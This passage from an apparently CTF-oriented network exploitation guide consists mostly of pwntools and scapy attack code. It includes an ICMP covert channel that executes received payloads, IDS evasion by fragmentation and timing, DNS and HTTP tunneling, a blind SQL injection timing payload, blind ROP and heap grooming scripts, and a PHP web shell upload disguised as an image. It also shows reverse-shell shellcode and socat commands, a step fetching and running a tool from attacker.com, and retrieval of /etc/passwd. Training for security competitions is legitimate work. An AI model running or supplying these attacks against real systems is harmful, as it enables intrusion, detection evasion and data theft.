def icmp_payload_delivery(target_ip, payload):
    """Deliver payload via ICMP packets"""
    chunk_size = 32  # ICMP payload size
    
    for i in range(0, len(payload), chunk_size):
        chunk = payload[i:i+chunk_size]
        
        # Craft ICMP packet with payload
        packet = IP(dst=target_ip)/ICMP(type=8, id=0x1337, seq=i//chunk_size)/Raw(load=chunk)
        
        send(packet, verbose=0)
        time.sleep(0.1)
    
    # Send terminator packet
    terminator = IP(dst=target_ip)/ICMP(type=8, id=0x1337, seq=0xFFFF)/Raw(load=b'END')
    send(terminator, verbose=0)

def icmp_listener():
    """Listen for ICMP payload on target"""
    def packet_handler(packet):
        if packet.haslayer(ICMP) and packet[ICMP].type == 8:
            if packet[ICMP].id == 0x1337:
                seq = packet[ICMP].seq
                payload = bytes(packet[Raw].load)
                
                if seq == 0xFFFF:
                    # Reconstruct and execute
                    full_payload = b''.join(chunks)
                    exec(full_payload)
                else:
                    chunks[seq] = payload
    
    chunks = {}
    sniff(filter="icmp", prn=packet_handler)
```

### Firewall and IDS Evasion

**Fragmentation Evasion**:

```python
#!/usr/bin/env python3
from scapy.all import *

def fragmented_payload_delivery(target_ip, target_port, payload):
    """Send payload in fragmented packets"""
    # Create TCP packet
    ip = IP(dst=target_ip)
    tcp = TCP(dport=target_port, flags='PA')
    packet = ip/tcp/Raw(load=payload)
    
    # Fragment the packet
    frags = fragment(packet, fragsize=8)  # 8-byte fragments
    
    # Send fragments
    for frag in frags:
        send(frag, verbose=0)
        time.sleep(0.01)  # Small delay between fragments

def overlapping_fragments_evasion(target_ip, payload):
    """Use overlapping fragments to evade IDS"""
    # Send decoy first fragment
    decoy = IP(dst=target_ip, frag=0, flags='MF')/Raw(load=b'DECOY_DATA')
    send(decoy, verbose=0)
    
    # Send actual payload overlapping
    real = IP(dst=target_ip, frag=0, flags=0)/Raw(load=payload)
    send(real, verbose=0)
```

**Timing-based Evasion**:

```python
#!/usr/bin/env python3
import time
import random

def slow_payload_delivery(io, payload):
    """Deliver payload slowly to evade rate-based detection"""
    for byte in payload:
        io.send(bytes([byte]))
        # Random delay between 0.1 and 1.0 seconds
        time.sleep(random.uniform(0.1, 1.0))

def polymorphic_delivery(io, payload, num_variations=5):
    """Send multiple variations to evade signature detection"""
    variations = [
        lambda p: b'\x90' * 10 + p,  # NOP sled
        lambda p: p + b'\x00' * 10,  # Null padding
        lambda p: b'\x90\x90' + p + b'\x90\x90',  # NOP wrapping
    ]
    
    for _ in range(num_variations):
        variation = random.choice(variations)
        modified_payload = variation(payload)
        io.send(modified_payload)
        time.sleep(random.uniform(0.5, 2.0))
```

**Protocol Tunneling**:

```python
#!/usr/bin/env python3

def dns_tunnel_delivery(payload, domain):
    """Tunnel payload through DNS queries"""
    import socket
    
    # Encode payload in subdomain
    encoded = base64.b32encode(payload).decode().lower()
    
    # Split into DNS label chunks (max 63 chars per label)
    labels = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
    
    # Query DNS
    for i, label in enumerate(labels):
        query = f'{i}.{label}.{domain}'
        try:
            socket.gethostbyname(query)
        except:
            pass  # Don't care about response

def http_tunnel_payload(payload):
    """Tunnel payload through HTTP headers"""
    import requests
    
    headers = {
        'X-Payload-Part-1': base64.b64encode(payload[:100]).decode(),
        'X-Payload-Part-2': base64.b64encode(payload[100:200]).decode(),
        'X-Payload-Part-3': base64.b64encode(payload[200:]).decode(),
    }
    
    requests.get('http://target.ctf/', headers=headers)
```

### Reliable Exploit Delivery

**Retry Logic with Backoff**:

```python
#!/usr/bin/env python3
import time

def reliable_exploit_delivery(host, port, payload, max_retries=10):
    """Deliver exploit with retry logic"""
    for attempt in range(max_retries):
        try:
            log.info(f'Attempt {attempt + 1}/{max_retries}')
            
            io = remote(host, port, level='error')
            io.send(payload)
            
            # Verify delivery
            response = io.recv(timeout=2)
            
            if b'success' in response or b'shell' in response:
                log.success('Exploit delivered successfully')
                return io
            
            io.close()
        
        except Exception as e:
            log.warning(f'Attempt failed: {e}')
        
        # Exponential backoff
        wait_time = min(2 ** attempt, 60)
        time.sleep(wait_time)
    
    log.error('All delivery attempts failed')
    return None

# Usage
payload = build_exploit()
io = reliable_exploit_delivery('target.ctf', 1337, payload)
if io:
    io.interactive()
```

**Checksum Verification**:

```python
#!/usr/bin/env python3
import hashlib

def verified_payload_delivery(io, payload):
    """Deliver payload with integrity check"""
    # Calculate checksum
    checksum = hashlib.sha256(payload).hexdigest()

    # Send payload size
    io.sendline(f'SIZE:{len(payload)}'.encode())
    
    # Send checksum
    io.sendline(f'CHECKSUM:{checksum}'.encode())
    
    # Send payload in chunks
    chunk_size = 1024
    for i in range(0, len(payload), chunk_size):
        chunk = payload[i:i+chunk_size]
        io.send(chunk)
        
        # Wait for ACK
        ack = io.recvline()
        if b'ACK' not in ack:
            log.error(f'Chunk {i//chunk_size} not acknowledged')
            return False
    
    # Verify on remote side
    io.sendline(b'VERIFY')
    response = io.recvline()
    
    if checksum.encode() in response:
        log.success('Payload integrity verified')
        return True
    else:
        log.error('Payload integrity check failed')
        return False
```

**Connection Pooling for Reliability**:

```python
#!/usr/bin/env python3
from pwn import *
import threading
import queue

class ConnectionPool:
    """Manage multiple connections for reliable exploitation"""
    
    def __init__(self, host, port, pool_size=5):
        self.host = host
        self.port = port
        self.pool_size = pool_size
        self.connections = queue.Queue()
        self.lock = threading.Lock()
        
        # Initialize connection pool
        self._populate_pool()
    
    def _populate_pool(self):
        """Create initial connections"""
        for _ in range(self.pool_size):
            try:
                conn = remote(self.host, self.port, level='error')
                self.connections.put(conn)
            except Exception as e:
                log.warning(f'Failed to create connection: {e}')
    
    def get_connection(self, timeout=5):
        """Get connection from pool"""
        try:
            return self.connections.get(timeout=timeout)
        except queue.Empty:
            # Create new connection if pool empty
            return remote(self.host, self.port, level='error')
    
    def return_connection(self, conn):
        """Return connection to pool"""
        if self.connections.qsize() < self.pool_size:
            self.connections.put(conn)
        else:
            conn.close()
    
    def send_payload(self, payload):
        """Send payload using pooled connection"""
        conn = self.get_connection()
        try:
            conn.send(payload)
            response = conn.recv(timeout=2)
            self.return_connection(conn)
            return response
        except Exception as e:
            log.warning(f'Connection failed: {e}')
            conn.close()
            return None

# Usage
pool = ConnectionPool('target.ctf', 1337, pool_size=10)

# Multiple exploit attempts
for i in range(100):
    payload = build_payload(i)
    response = pool.send_payload(payload)
    if response and b'success' in response:
        log.success(f'Exploit successful on attempt {i}')
        break
```

### Advanced Exploitation Techniques

**Blind Exploitation with Side Channels**:

```python
#!/usr/bin/env python3
from pwn import *
import time

def blind_exploitation_timing(host, port):
    """Exploit blind vulnerability using timing side channel"""
    
    def test_condition(condition_payload):
        """Test if condition is true via timing"""
        start = time.perf_counter()
        
        try:
            io = remote(host, port, level='error')
            io.send(condition_payload)
            io.recv(timeout=5)
            io.close()
        except:
            pass
        
        elapsed = time.perf_counter() - start
        return elapsed
    
    # Leak data byte by byte
    leaked_data = b''
    
    for byte_pos in range(100):
        for byte_val in range(256):
            # Craft payload that causes delay if byte matches
            # Example: if byte at position == value, sleep
            payload = craft_timing_payload(byte_pos, byte_val)
            
            elapsed = test_condition(payload)
            
            # If delay detected, byte found
            if elapsed > 2.0:
                leaked_data += bytes([byte_val])
                log.info(f'Position {byte_pos}: {hex(byte_val)} | {leaked_data}')
                break
        else:
            # No match found, end of data
            break
    
    return leaked_data

def craft_timing_payload(position, value):
    """Craft payload for timing-based leak"""
    # This depends on the specific vulnerability
    # Example for blind SQLi
    sqli = f"' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),{position+1},1))={value}) THEN pg_sleep(2) ELSE 1 END)--"
    return sqli.encode()
```

**Blind ROP Chain Construction**:

```python
#!/usr/bin/env python3
from pwn import *

def blind_rop_attack(host, port):
    """Construct ROP chain blindly by detecting crashes"""
    
    def check_crash(payload):
        """Check if payload causes crash"""
        try:
            io = remote(host, port, level='error', timeout=2)
            io.send(payload)
            response = io.recvall(timeout=1)
            io.close()
            return False  # No crash, got response
        except:
            return True  # Crash or connection closed
    
    # Find buffer overflow offset
    log.info('Finding overflow offset...')
    offset = 0
    for i in range(0, 500, 8):
        payload = b'A' * i + b'B' * 8
        if check_crash(payload):
            offset = i
            log.success(f'Overflow at offset: {offset}')
            break
    
    # Find stop gadget (gadget that doesn't crash)
    log.info('Finding stop gadget...')
    stop_gadget = None
    
    for addr in range(0x400000, 0x401000, 1):
        payload = b'A' * offset + p64(addr)
        if not check_crash(payload):
            stop_gadget = addr
            log.success(f'Stop gadget: {hex(stop_gadget)}')
            break
    
    # Find pop rdi gadget
    log.info('Finding pop rdi gadget...')
    pop_rdi = None
    
    for addr in range(0x400000, 0x402000, 1):
        # Test by seeing if we can control crash behavior
        payload = b'A' * offset + p64(addr) + p64(0xdeadbeef) + p64(stop_gadget)
        if not check_crash(payload):
            pop_rdi = addr
            log.success(f'pop rdi gadget: {hex(pop_rdi)}')
            break
    
    # Build ROP chain with discovered gadgets
    rop_chain = flat(
        b'A' * offset,
        pop_rdi,
        0x400000,  # Argument
        stop_gadget
    )
    
    return rop_chain
```

**Heap Feng Shui over Network**:

```python
#!/usr/bin/env python3
from pwn import *

def network_heap_fengshui(host, port):
    """Perform heap feng shui over network connection"""
    io = remote(host, port)
    
    # Phase 1: Fill heap with controlled objects
    log.info('Phase 1: Heap grooming')
    allocations = []
    
    for i in range(20):
        io.sendlineafter(b'> ', b'1')  # Allocate
        io.sendlineafter(b'Size: ', b'128')
        io.sendlineafter(b'Data: ', b'A' * 128)
        allocations.append(i)
    
    # Phase 2: Create holes in specific pattern
    log.info('Phase 2: Creating holes')
    free_pattern = [0, 2, 4, 6, 8, 10, 12, 14, 16, 18]
    
    for idx in free_pattern:
        io.sendlineafter(b'> ', b'2')  # Free
        io.sendlineafter(b'Index: ', str(idx).encode())
    
    # Phase 3: Allocate victim object
    log.info('Phase 3: Victim allocation')
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Size: ', b'128')
    io.sendlineafter(b'Data: ', b'VICTIM')
    victim_idx = 20
    
    # Phase 4: Allocate adjacent objects
    log.info('Phase 4: Adjacent allocations')
    for i in range(10):
        io.sendlineafter(b'> ', b'1')
        io.sendlineafter(b'Size: ', b'128')
        io.sendlineafter(b'Data: ', cyclic(128))
    
    # Phase 5: Trigger overflow into victim
    log.info('Phase 5: Heap overflow')
    io.sendlineafter(b'> ', b'3')  # Edit
    io.sendlineafter(b'Index: ', str(victim_idx - 1).encode())
    
    # Overflow payload
    overflow = flat(
        b'B' * 128,  # Fill current chunk
        p64(0x0),    # Prev size
        p64(0x91),   # Size (fake)
        p64(0x0),    # fd
        p64(0x0)     # bk
    )
    
    io.sendlineafter(b'Data: ', overflow)
    
    # Phase 6: Trigger use
    io.sendlineafter(b'> ', b'4')  # Use
    io.sendlineafter(b'Index: ', str(victim_idx).encode())
    
    io.interactive()

network_heap_fengshui('target.ctf', 1337)
```

### Exploitation Over Restricted Networks

**HTTP-only Exploitation**:

```python
#!/usr/bin/env python3
import requests
import time

def http_only_shell(url):
    """Achieve shell over HTTP-only access"""
    
    # Upload web shell
    webshell = b'<?php system($_GET["c"]); ?>'
    
    files = {'file': ('shell.php', webshell, 'image/jpeg')}
    response = requests.post(url + '/upload.php', files=files)
    
    if 'success' in response.text:
        shell_url = url + '/uploads/shell.php'
        log.success(f'Web shell uploaded: {shell_url}')
        
        # Interactive shell over HTTP
        while True:
            cmd = input('$ ')
            if cmd == 'exit':
                break
            
            result = requests.get(shell_url, params={'c': cmd})
            print(result.text)

def http_tunnel_shell(url, session_id):
    """Tunnel shell through HTTP requests"""
    
    def send_command(cmd):
        """Send command via HTTP"""
        data = {
            'session': session_id,
            'cmd': cmd
        }
        response = requests.post(url + '/execute', data=data)
        return response.text
    
    def read_output():
        """Read command output via HTTP"""
        params = {'session': session_id}
        response = requests.get(url + '/output', params=params)
        return response.text
    
    # Interactive loop
    while True:
        cmd = input('shell> ')
        if cmd == 'exit':
            break
        
        send_command(cmd)
        time.sleep(0.5)
        output = read_output()
        print(output)
```

**WebSocket Exploitation**:

```python
#!/usr/bin/env python3
from websocket import create_connection
import json

def websocket_exploit(ws_url):
    """Exploit via WebSocket connection"""
    ws = create_connection(ws_url)
    
    # Send exploit payload
    payload = {
        'action': 'execute',
        'cmd': 'id',
        'args': ['../../etc/passwd']
    }
    
    ws.send(json.dumps(payload))
    
    # Receive response
    result = ws.recv()
    print(f'Result: {result}')
    
    # Achieve interactive shell
    while True:
        cmd = input('ws> ')
        if cmd == 'exit':
            break
        
        payload = {'action': 'shell', 'cmd': cmd}
        ws.send(json.dumps(payload))
        
        output = ws.recv()
        print(output)
    
    ws.close()
```

**SSH Tunneling for Pivoting**:

```python
#!/usr/bin/env python3
from pwn import *
import subprocess

def establish_ssh_tunnel(compromised_host, internal_target):
    """Create SSH tunnel through compromised host"""
    
    # Setup SSH tunnel
    # Local port 9050 -> compromised_host -> internal_target:1337
    tunnel_cmd = [
        'ssh',
        '-N',  # No command
        '-L', '9050:{}:1337'.format(internal_target),
        'user@{}'.format(compromised_host),
        '-o', 'StrictHostKeyChecking=no'
    ]
    
    tunnel_proc = subprocess.Popen(tunnel_cmd)
    time.sleep(2)  # Wait for tunnel establishment
    
    # Now exploit internal target through tunnel
    io = remote('localhost', 9050)
    
    # Send exploit
    payload = build_exploit()
    io.send(payload)
    io.interactive()
    
    # Cleanup
    tunnel_proc.terminate()
```

---

## Related Topics

**Essential Prerequisites**:

- C Programming and Memory Management
- Assembly Language (x86/x64)
- Operating System Internals
- TCP/IP Network Fundamentals

**Advanced Integration**:

- Wireless Network Exploitation (WiFi, Bluetooth)
- Mobile Application Network Security (iOS/Android)
- Cloud Infrastructure Exploitation (AWS, GCP, Azure)
- IoT and Embedded Device Network Exploitation
- Industrial Control Systems (ICS/SCADA) Network Security

**Protocol-Specific Exploitation**:

- SMB/CIFS Exploitation
- RDP Security and Exploitation
- Database Protocol Attacks (MySQL, PostgreSQL, MSSQL)
- LDAP and Active Directory Exploitation
- VoIP/SIP Protocol Exploitation

**Advanced Topics**:

- Kernel Network Stack Exploitation
- Custom Protocol Reverse Engineering
- Zero-day Network Vulnerability Discovery
- Advanced Persistent Threat (APT) Techniques
- Red Team Infrastructure and C2 Development

**Tool Mastery**:

- Metasploit Framework Modules
- Burp Suite Pro Extensions
- Custom Exploit Development with Pwntools
- Network Traffic Analysis with Wireshark
- Scapy Advanced Usage and Custom Protocols

---


## Interactive Shell Handling

Proper shell management is critical for maintaining access and executing commands reliably on compromised systems.

### Basic Shell Types

**Bind Shell vs Reverse Shell:**

```python
from pwn import *

# Bind shell: Target listens, attacker connects
def bind_shell(port=4444):
    """Target opens port and waits for connection"""
    shellcode = shellcraft.amd64.linux.bindsh(port)
    return asm(shellcode)

# Reverse shell: Target connects back to attacker
def reverse_shell(attacker_ip, port=4444):
    """Target connects to attacker's listener"""
    shellcode = shellcraft.amd64.linux.connect(attacker_ip, port)
    shellcode += shellcraft.amd64.linux.dupsh()
    return asm(shellcode)

# Usage
bind_payload = bind_shell(1337)
reverse_payload = reverse_shell('10.0.0.5', 4444)

log.info(f"Bind shell size: {len(bind_payload)} bytes")
log.info(f"Reverse shell size: {len(reverse_payload)} bytes")
```

**Setting Up Listeners:**

```bash
# Netcat listener (traditional)
nc -lvnp 4444

# Netcat with specific bind address
nc -lvnp 4444 -s 10.0.0.5

# Pwntools listener (Python)
python3 << 'EOF'
from pwn import *

l = listen(4444)
log.info(f"Listening on port 4444")
conn = l.wait_for_connection()
log.success("Connection received!")
conn.interactive()
EOF

# Socat with TTY support
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# Metasploit listener
msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST 10.0.0.5; set LPORT 4444; exploit"
```

### Shell Upgrade Techniques

**Basic Shell to Interactive TTY:**

```bash
# Method 1: Python PTY
python -c 'import pty; pty.spawn("/bin/bash")'
# Or Python 3
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Background with Ctrl+Z, then:
stty raw -echo; fg
# Press Enter twice
export TERM=xterm
export SHELL=/bin/bash

# Method 2: Script command
script /dev/null -c /bin/bash

# Method 3: Socat (if available on target)
# On attacker:
socat file:`tty`,raw,echo=0 tcp-listen:4444
# On target:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.5:4444
```

**Pwntools Shell Upgrade:**

```python
from pwn import *

p = remote('target.com', 1337)

# Send exploit
p.sendline(payload)

# Wait for shell
sleep(1)

# Upgrade to interactive
log.info("Upgrading shell...")
p.sendline(b'python3 -c "import pty; pty.spawn(\'/bin/bash\')"')
sleep(0.5)

# Set terminal size
p.sendline(b'export TERM=xterm')
p.sendline(b'stty rows 50 cols 200')

# Interactive mode
p.interactive()
```

**Handling Non-Interactive Shells:**

```python
def send_command(p, cmd, timeout=5):
    """
    Execute command on non-interactive shell
    Returns output
    """
    marker = b"CMD_COMPLETE_" + os.urandom(8).hex().encode()
    
    # Send command with marker
    p.sendline(cmd + b'; echo ' + marker)
    
    # Read until marker
    try:
        output = p.recvuntil(marker, timeout=timeout)
        # Strip marker from output
        return output[:-len(marker)]
    except EOFError:
        log.error("Connection closed")
        return None
    except:
        log.error(f"Timeout waiting for command: {cmd}")
        return None

# Usage
p = remote('target.com', 1337)
result = send_command(p, b'id')
log.info(f"Output: {result.decode()}")
```

### Advanced Shell Interaction

**Multi-line Command Execution:**

```python
def execute_multiline(p, commands):
    """
    Execute multi-line script on remote shell
    """
    # Method 1: Here document
    script = b'cat << \'EOF\' | sh\n'
    for cmd in commands:
        script += cmd + b'\n'
    script += b'EOF\n'
    
    p.sendline(script)
    
    # Method 2: Base64 encoded
    script_b64 = b64e(b'\n'.join(commands))
    p.sendline(b'echo ' + script_b64 + b' | base64 -d | sh')

# Usage
commands = [
    b'cd /tmp',
    b'wget http://attacker.com/tool',
    b'chmod +x tool',
    b'./tool'
]

execute_multiline(p, commands)
```

**File Transfer Over Shell:**

```python
def upload_file_via_shell(p, local_path, remote_path):
    """
    Upload file using only shell access
    """
    with open(local_path, 'rb') as f:
        data = f.read()
    
    # Method 1: Base64 encoding
    encoded = b64e(data)
    
    log.info(f"Uploading {local_path} ({len(data)} bytes)")
    
    # Send in chunks (avoid command line limits)
    chunk_size = 1000
    p.sendline(f'rm -f {remote_path}'.encode())
    
    for i in range(0, len(encoded), chunk_size):
        chunk = encoded[i:i+chunk_size]
        p.sendline(b'echo ' + chunk + b' >> /tmp/upload.b64')
        sleep(0.1)  # Prevent overflow
    
    # Decode on target
    p.sendline(f'base64 -d /tmp/upload.b64 > {remote_path}'.encode())
    p.sendline(f'rm /tmp/upload.b64'.encode())
    p.sendline(f'chmod +x {remote_path}'.encode())
    
    log.success(f"Upload complete: {remote_path}")

# Usage
upload_file_via_shell(p, './exploit', '/tmp/exploit')
```

**Download File from Remote:**

```python
def download_file_via_shell(p, remote_path, local_path):
    """
    Download file using shell access
    """
    # Base64 encode file on remote
    p.sendline(f'base64 {remote_path}'.encode())
    
    # Collect output
    encoded = b''
    while True:
        try:
            line = p.recvline(timeout=2)
            if b'$' in line or b'#' in line:  # Shell prompt
                break
            encoded += line.strip()
        except:
            break
    
    # Decode and save
    try:
        data = b64d(encoded)
        with open(local_path, 'wb') as f:
            f.write(data)
        log.success(f"Downloaded {len(data)} bytes to {local_path}")
        return data
    except Exception as e:
        log.error(f"Download failed: {e}")
        return None

# Usage
data = download_file_via_shell(p, '/etc/passwd', './passwd')
```

### Shell Multiplexing

**Managing Multiple Shells:**

```python
class ShellManager:
    """
    Manage multiple remote shells
    """
    def __init__(self):
        self.shells = {}
        self.active = None
    
    def add_shell(self, name, host, port):
        """Connect to new shell"""
        try:
            p = remote(host, port)
            self.shells[name] = p
            log.success(f"Connected: {name} ({host}:{port})")
            return p
        except Exception as e:
            log.error(f"Connection failed: {e}")
            return None
    
    def switch(self, name):
        """Switch active shell"""
        if name in self.shells:
            self.active = name
            log.info(f"Switched to: {name}")
            return self.shells[name]
        else:
            log.error(f"Shell not found: {name}")
            return None
    
    def execute_all(self, command):
        """Execute command on all shells"""
        results = {}
        for name, shell in self.shells.items():
            try:
                shell.sendline(command)
                output = shell.recvline(timeout=2)
                results[name] = output
            except Exception as e:
                results[name] = f"Error: {e}"
        return results
    
    def close_all(self):
        """Close all connections"""
        for name, shell in self.shells.items():
            try:
                shell.close()
                log.info(f"Closed: {name}")
            except:
                pass

# Usage
manager = ShellManager()
manager.add_shell('web1', '10.0.0.10', 4444)
manager.add_shell('web2', '10.0.0.11', 4444)
manager.add_shell('db1', '10.0.0.20', 4444)

# Execute on all
results = manager.execute_all(b'hostname')
for name, output in results.items():
    log.info(f"{name}: {output.decode()}")
```

## Connection Stability

Maintaining reliable connections is essential for successful exploitation, especially in unstable network conditions.

### Connection Monitoring

**Keepalive Implementation:**

```python
from pwn import *
import threading
import time

class StableConnection:
    """
    Wrapper for maintaining stable remote connection
    """
    def __init__(self, host, port, keepalive_interval=30):
        self.host = host
        self.port = port
        self.conn = None
        self.keepalive_interval = keepalive_interval
        self.keepalive_thread = None
        self.running = False
        
    def connect(self):
        """Establish connection"""
        try:
            self.conn = remote(self.host, self.port)
            log.success(f"Connected to {self.host}:{self.port}")
            self.running = True
            self._start_keepalive()
            return True
        except Exception as e:
            log.error(f"Connection failed: {e}")
            return False
    
    def _keepalive_worker(self):
        """Background thread sending keepalive packets"""
        while self.running:
            try:
                # Send neutral command that doesn't affect state
                self.conn.sendline(b'echo keepalive > /dev/null')
                time.sleep(self.keepalive_interval)
            except:
                log.warning("Keepalive failed - connection may be dead")
                break
    
    def _start_keepalive(self):
        """Start keepalive thread"""
        self.keepalive_thread = threading.Thread(
            target=self._keepalive_worker,
            daemon=True
        )
        self.keepalive_thread.start()
        log.info(f"Keepalive started (interval: {self.keepalive_interval}s)")
    
    def send(self, data):
        """Send with error handling"""
        try:
            self.conn.send(data)
        except Exception as e:
            log.error(f"Send failed: {e}")
            self._reconnect()
    
    def sendline(self, data):
        """Sendline with error handling"""
        try:
            self.conn.sendline(data)
        except Exception as e:
            log.error(f"Sendline failed: {e}")
            self._reconnect()
    
    def recv(self, timeout=None):
        """Receive with error handling"""
        try:
            return self.conn.recv(timeout=timeout)
        except EOFError:
            log.error("Connection closed by remote")
            return None
        except Exception as e:
            log.error(f"Receive failed: {e}")
            return None
    
    def _reconnect(self):
        """Attempt to reconnect"""
        log.warning("Attempting reconnection...")
        self.running = False
        if self.conn:
            self.conn.close()
        time.sleep(2)
        return self.connect()
    
    def close(self):
        """Clean shutdown"""
        self.running = False
        if self.conn:
            self.conn.close()
        log.info("Connection closed")

# Usage
stable_conn = StableConnection('target.com', 1337, keepalive_interval=60)
if stable_conn.connect():
    stable_conn.sendline(b'id')
    output = stable_conn.recv(timeout=5)
    log.info(f"Output: {output}")
```

**Connection Health Checks:**

```python
def check_connection_health(p, timeout=5):
    """
    Verify connection is still alive and responsive
    """
    try:
        # Send harmless command
        test_marker = os.urandom(8).hex()
        p.sendline(f'echo {test_marker}'.encode())
        
        # Wait for response
        response = p.recvuntil(test_marker.encode(), timeout=timeout)
        
        if test_marker.encode() in response:
            log.success("Connection healthy")
            return True
        else:
            log.warning("Unexpected response")
            return False
            
    except EOFError:
        log.error("Connection closed")
        return False
    except Exception as e:
        log.error(f"Health check failed: {e}")
        return False

# Periodic health monitoring
def monitor_connection(p, interval=60):
    """
    Monitor connection health periodically
    """
    while True:
        time.sleep(interval)
        if not check_connection_health(p):
            log.error("Connection unhealthy - reconnect required")
            break
        else:
            log.info("Health check passed")

# Start monitoring in background
import threading
monitor_thread = threading.Thread(
    target=monitor_connection,
    args=(p, 60),
    daemon=True
)
monitor_thread.start()
```

### Buffer Management

**Preventing Buffer Overflow:**

```python
class BufferedConnection:
    """
    Connection wrapper with buffer management
    """
    def __init__(self, host, port, buffer_size=8192):
        self.conn = remote(host, port)
        self.buffer = b''
        self.buffer_size = buffer_size
    
    def recv_managed(self, size=None, timeout=None):
        """
        Receive with buffer management
        """
        if size is None:
            size = self.buffer_size
        
        # Return from buffer if available
        if len(self.buffer) >= size:
            data = self.buffer[:size]
            self.buffer = self.buffer[size:]
            return data
        
        # Receive more data
        try:
            new_data = self.conn.recv(size - len(self.buffer), timeout=timeout)
            self.buffer += new_data
            
            # Return requested amount
            data = self.buffer[:size]
            self.buffer = self.buffer[size:]
            return data
            
        except Exception as e:
            log.error(f"Receive error: {e}")
            return None
    
    def recvline_managed(self, timeout=None):
        """
        Receive line with buffer management
        """
        while b'\n' not in self.buffer:
            try:
                chunk = self.conn.recv(1024, timeout=timeout)
                if not chunk:
                    break
                self.buffer += chunk
            except Exception as e:
                log.error(f"Recvline error: {e}")
                break
        
        # Extract line from buffer
        if b'\n' in self.buffer:
            line, self.buffer = self.buffer.split(b'\n', 1)
            return line + b'\n'
        else:
            # No complete line, return what we have
            line = self.buffer
            self.buffer = b''
            return line
    
    def clear_buffer(self):
        """Clear internal buffer"""
        self.buffer = b''
        log.info("Buffer cleared")
    
    def get_buffer_size(self):
        """Get current buffer size"""
        return len(self.buffer)

# Usage
buffered = BufferedConnection('target.com', 1337)
data = buffered.recv_managed(size=100)
line = buffered.recvline_managed(timeout=5)
```

### Socket Options for Stability

**TCP Socket Tuning:**

```python
import socket

def create_stable_socket(host, port):
    """
    Create TCP socket with stability options
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Enable TCP keepalive
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    
    # TCP keepalive parameters (Linux)
    # Start sending keepalives after 60 seconds of inactivity
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 60)
    
    # Send keepalives every 10 seconds
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
    
    # Close connection after 3 failed keepalives
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
    
    # Disable Nagle's algorithm for lower latency
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    
    # Set send/receive buffer sizes
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 65536)
    
    # Set timeouts
    sock.settimeout(30)
    
    try:
        sock.connect((host, port))
        log.success(f"Connected with stability options enabled")
        return sock
    except Exception as e:
        log.error(f"Connection failed: {e}")
        sock.close()
        return None

# Use with pwntools
sock = create_stable_socket('target.com', 1337)
if sock:
    p = remote.fromsocket(sock)
    p.sendline(b'id')
```

## Timeout and Retry Logic

Robust exploitation requires handling network failures and implementing intelligent retry mechanisms.

### Timeout Strategies

**Adaptive Timeout:**

```python
class AdaptiveTimeout:
    """
    Dynamically adjust timeouts based on response times
    """
    def __init__(self, initial_timeout=5, min_timeout=1, max_timeout=30):
        self.timeout = initial_timeout
        self.min_timeout = min_timeout
        self.max_timeout = max_timeout
        self.response_times = []
        self.max_samples = 10
    
    def record_response(self, response_time):
        """Record a response time"""
        self.response_times.append(response_time)
        if len(self.response_times) > self.max_samples:
            self.response_times.pop(0)
        
        # Calculate new timeout: mean + 2*stddev
        if len(self.response_times) >= 3:
            import statistics
            mean = statistics.mean(self.response_times)
            stdev = statistics.stdev(self.response_times)
            new_timeout = mean + (2 * stdev)
            
            # Clamp to min/max
            self.timeout = max(self.min_timeout, 
                             min(self.max_timeout, new_timeout))
            
            log.info(f"Adjusted timeout to {self.timeout:.2f}s")
    
    def get_timeout(self):
        """Get current timeout value"""
        return self.timeout

def send_with_adaptive_timeout(p, data, timeout_manager):
    """
    Send and receive with adaptive timeout
    """
    start_time = time.time()
    
    p.sendline(data)
    
    try:
        response = p.recvline(timeout=timeout_manager.get_timeout())
        elapsed = time.time() - start_time
        timeout_manager.record_response(elapsed)
        return response
    except Exception as e:
        log.error(f"Timeout or error: {e}")
        return None

# Usage
timeout_mgr = AdaptiveTimeout(initial_timeout=5)
p = remote('target.com', 1337)

for i in range(10):
    result = send_with_adaptive_timeout(p, f'test {i}'.encode(), timeout_mgr)
    if result:
        log.info(f"Response: {result.strip()}")
```

**Exponential Backoff:**

```python
def exponential_backoff_retry(func, max_attempts=5, base_delay=1, max_delay=60):
    """
    Retry function with exponential backoff
    
    Delay sequence: 1s, 2s, 4s, 8s, 16s, ...
    """
    import random
    
    for attempt in range(max_attempts):
        try:
            log.info(f"Attempt {attempt + 1}/{max_attempts}")
            return func()
        except Exception as e:
            if attempt == max_attempts - 1:
                log.error(f"All attempts failed: {e}")
                raise
            
            # Calculate delay with jitter
            delay = min(base_delay * (2 ** attempt), max_delay)
            jitter = random.uniform(0, delay * 0.1)  # Add 0-10% jitter
            total_delay = delay + jitter
            
            log.warning(f"Attempt failed: {e}")
            log.info(f"Retrying in {total_delay:.2f}s...")
            time.sleep(total_delay)

# Usage
def connect_and_exploit():
    p = remote('target.com', 1337)
    p.sendline(payload)
    return p.recvline()

result = exponential_backoff_retry(connect_and_exploit, max_attempts=5)
```

### Retry Patterns

**Connection Retry Wrapper:**

```python
class RetryableConnection:
    """
    Connection with automatic retry on failure
    """
    def __init__(self, host, port, max_retries=3, retry_delay=2):
        self.host = host
        self.port = port
        self.max_retries = max_retries
        self.retry_delay = retry_delay
        self.conn = None
        self._connect_with_retry()
    
    def _connect_with_retry(self):
        """Establish connection with retries"""
        for attempt in range(self.max_retries):
            try:
                log.info(f"Connection attempt {attempt + 1}/{self.max_retries}")
                self.conn = remote(self.host, self.port, level='error')
                log.success("Connected successfully")
                return True
            except Exception as e:
                log.warning(f"Connection failed: {e}")
